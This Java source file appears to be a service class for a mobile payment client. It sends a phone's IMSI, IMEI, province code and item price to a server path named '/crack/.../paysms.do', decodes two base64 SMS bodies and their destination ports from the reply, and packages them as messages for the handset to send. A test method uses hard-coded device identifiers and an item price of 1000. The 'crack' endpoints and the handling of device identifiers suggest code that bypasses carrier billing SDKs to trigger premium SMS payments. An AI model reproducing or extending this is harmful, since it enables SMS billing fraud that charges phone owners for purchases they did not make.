package com.jxt.pay.appclient.service.dynamic.net;

import java.util.HashMap;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * http://cartoon.yiqiao580.com:9800/crack/cartoon/paysms.do?ptid=40000&imsi=460001123143655&imei=867376023133651&cpparam=test123&version=1.0.0&itemId=300007590001&itemPrice=10&itemSafeLevel=2&itemMethod=11&itemEx=
 * @author leoliu
 *
 */
public class VideoSdkDynamicService implements IDynamicService{

	private static final String TAG = "videoSdk";
	private static Logger logger = Logger.getLogger(VideoSdkDynamicService.class);
	
	private String PARAMS = "ptid={ptid}&imsi={imsi}&imei={imei}&cpparam={cpparam}&version=1.0.2&noid={noid}&ctid={ctid}&provid={provid}&itemId={itemId}&itemPrice={itemPrice}";
	
	@Override
	public String getType() {
		return TAG;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		
		String url = map.get("url");
		
		String ptid = map.get("ptid");
		String imsi = map.get("imsi");
		String imei = map.get("imei");
		String cpparam = map.get("cpparam");
		String noid = map.get("noid");
		String ctid = map.get("ctid");
		
		String province = map.get("province");
		String provid = getProvid(province);
		
		String itemId = map.get("itemId");
		String itemPrice = map.get("itemPrice");
		
		String params = PARAMS.replace("{ptid}", ptid);
		params = params.replace("{imsi}",imsi);
		params = params.replace("{imei}",imei);
		params = params.replace("{cpparam}",cpparam);
		
		params = params.replace("{noid}",noid);
		params = params.replace("{ctid}",ctid);
		params = params.replace("{provid}", provid);
		params = params.replace("{itemId}",itemId);
		params = params.replace("{itemPrice}",itemPrice);
		
		String responseJson = GetData.getData(url, params);
		
		if(responseJson != null && responseJson.length() > 0){
			try {
				JSONObject jo = new JSONObject(responseJson);
				
				int result = jo.getInt("result");
				
				if(result == 0){
					String smsContent = jo.getString("sms");
					String port = jo.getString("port");
					
					String[] smsContentArr = smsContent.split("&");
					String[] portArr = port.split("&");
					
					Sms sms = new Sms();
					sms.setSmsDest(portArr[0]);
					sms.setSmsContent(CommonUtil.base64Decode(smsContentArr[0]));
					sms.setSuccessTimeOut(2);
					
					Sms sms1 = new Sms();
					sms1.setSmsDest(portArr[1]);
					sms1.setSmsContent(CommonUtil.base64Decode(smsContentArr[1]));
					sms1.setSuccessTimeOut(2);
					
					return XstreamHelper.toXml(sms).append("<wait>5</wait>").append(XstreamHelper.toXml(sms1)).toString();
				}else{
					return DynamicUtils.parseError(""+result);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	private static Map<String, String> provinceMap = new HashMap<String, String>();
	
	static{
		provinceMap.put("8611","01");
		provinceMap.put("8612","02");
		provinceMap.put("8613","03");
		provinceMap.put("8614","04");
		provinceMap.put("8615","05");
		
		provinceMap.put("8621","06");
		provinceMap.put("8622","07");
		provinceMap.put("8623","08");
		provinceMap.put("8631","09");
		provinceMap.put("8632","10");

		provinceMap.put("8633","11");
		provinceMap.put("8634","12");
		provinceMap.put("8635","13");
		provinceMap.put("8636","14");
		provinceMap.put("8637","15");
		
		provinceMap.put("8641","16");
		provinceMap.put("8642","17");
		provinceMap.put("8643","18");
		provinceMap.put("8644","19");
		provinceMap.put("8645","20");
		
		provinceMap.put("8646","21");
		provinceMap.put("8651","22");
		provinceMap.put("8652","23");
		provinceMap.put("8653","24");
		provinceMap.put("8654","25");
		
		provinceMap.put("8661","26");
		provinceMap.put("8662","27");
		provinceMap.put("8663","28");
		provinceMap.put("8664","29");
		provinceMap.put("8665","30");
		
		provinceMap.put("8650","31");
	}
	
	private String getProvid(String province){
		return provinceMap.get(province);
	}

	public static void main(String[] args){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("type","videoSdk");
		
		map.put("url","http://video.yiqiao580.com:9800/crack/video/paysms.do");
		
		map.put("ptid", "73100");
		map.put("cpparam","13B101a014444332");
		map.put("imsi","460022475975452");
		map.put("imei","866332026295410");
		
		map.put("noid","10213724");
		map.put("ctid","616293083");
		
		map.put("itemId","2028596831");
		map.put("itemPrice","1000");
		
		map.put("province","8615");
		
		System.out.println(new VideoSdkDynamicService().dynamic(map));
	}
}
